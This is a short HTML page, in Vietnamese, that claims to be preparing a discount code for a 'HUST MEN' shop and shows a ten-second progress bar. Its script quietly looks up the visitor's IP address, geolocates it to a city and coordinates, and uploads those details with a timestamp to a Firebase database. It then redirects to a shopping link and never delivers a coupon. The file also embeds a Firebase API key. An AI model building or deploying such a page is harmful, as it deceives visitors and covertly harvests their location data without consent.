<head>

<meta charset="UTF-8">

gtag('js', new Date());

<style>
body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: linear-gradient(135deg, #ffcc99, #ffffff);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    overflow: hidden;
}

.container {
    background: white;
    padding: 40px;
    border-radius: 15px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
    text-align: center;
    width: 420px;
    max-width: 90%;
}

.logo {
    width: 200px;
    margin-bottom: 20px;
}

.title {
    font-size: 26px;
    font-weight: bold;
    color: #ff9800;
}

.message {
    font-size: 18px;
    color: #444;
    margin-top: 10px;
}

.progress {
    width: 100%;
    height: 12px;
    background: #eee;
    border-radius: 10px;
    margin-top: 25px;
    overflow: hidden;
}

.progress-bar {
    height: 100%;
    width: 0%;
    background: #ff9800;
    animation: load 10s linear forwards;
}

@keyframes load {
    from { width: 0%; }
    to { width: 100%; }
}
</style>

</head>

<body>

<div class="container">
    <img src="logo.png" class="logo">
    <div class="title">HUST MEN</div>

    <div class="message">
        Hệ thống đang chuẩn bị mã giảm giá cho bạn.<br>
        Vui lòng chờ trong giây lát...
    </div>

    <div class="progress">
        <div class="progress-bar"></div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyBpThQgsy6FoGMFALL1mMdCDrupeqwD_c8",
    authDomain: "hust-man.firebaseapp.com",
    databaseURL: "https://hust-man-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "hust-man",
    storageBucket: "hust-man.firebasestorage.app",
    messagingSenderId: "1097366065563",
    appId: "1:1097366065563:web:cd629b7a98138506ab113e"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Lấy IP
async function getIP() {
    const res = await fetch("https://api64.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
}

// MAIN FLOW (QUAN TRỌNG)
async function mainFlow() {
    try {
        const ip = await getIP();

        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();

        await push(ref(db, "USER_MAP"), {
            ip: ip,
            Thanh_pho: data.city || "Unknown",
            lat: data.latitude || 0,
            lon: data.longitude || 0,
            thoi_gian: new Date().toLocaleString()
        });

        console.log("✅ Đã lưu Firebase");

    } catch (err) {
        console.error("❌ Lỗi:", err);
    } finally {
        // luôn redirect dù thành công hay lỗi
        setTimeout(() => {
            window.location.href = "https://vn.shp.ee/TuGyf3Ro";
        }, 1000);
    }
}

// chạy sau 10s (đúng với progress bar)
setTimeout(mainFlow, 10000);

</script>

</body>
</html>
